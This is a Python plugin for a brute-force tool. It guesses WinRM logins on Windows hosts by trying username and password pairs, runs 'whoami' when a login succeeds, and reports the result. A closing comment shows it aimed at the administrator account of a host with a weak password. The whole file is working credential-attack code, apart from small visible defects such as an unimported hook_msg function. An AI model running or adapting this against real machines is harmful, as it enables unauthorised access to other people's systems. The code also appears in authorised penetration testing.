#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
@Author: reber
@Mail: reber0ask@qq.com
@Date: 2019-12-26 14:00:25
@LastEditTime : 2020-02-16 18:39:04
'''

import socket
import winrm

from .baseclass import BruteBaseClass


class BruteForce(BruteBaseClass):
    """BruteForce"""

    def worker(self,hpup):
        if self.flag:
            socket.setdefaulttimeout(self.timeout)

            host,port,user,pwd = hpup
            try:
                s = winrm.Session("http://{}:{}/wsman".format(host,port), auth=(user, pwd))
                r = s.run_cmd("whoami")
            except Exception as e:
                hook_msg((False,host,port,user,pwd))
            else:
                hook_msg((True,host,port,user,pwd))
            finally:
                s.close()

# python3 rsbrute.py -s winrm -i 10.11.11.5 -l administrator -p 123456
